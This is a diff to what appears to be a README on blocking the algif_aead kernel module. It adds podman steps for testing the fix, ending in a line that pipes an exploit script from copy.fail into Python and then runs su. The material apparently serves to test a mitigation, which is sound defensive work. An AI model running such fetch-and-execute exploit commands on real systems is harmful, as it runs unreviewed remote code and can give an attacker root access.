@@ -16,3 +16,15 @@ initcall_blacklist=algif_aead_init
 # See https://copy.fail
 blacklist algif_aead
 ```
+
+Test with podman
+
+```sh
+podman build -t copy-fail .
+podman run -d --rm --name copy-fail --replace copy-fail
+podman exec -it copy-fail /bin/bash
+```
+
+```sh
+curl https://copy.fail/exp | python3.11 && su
+```
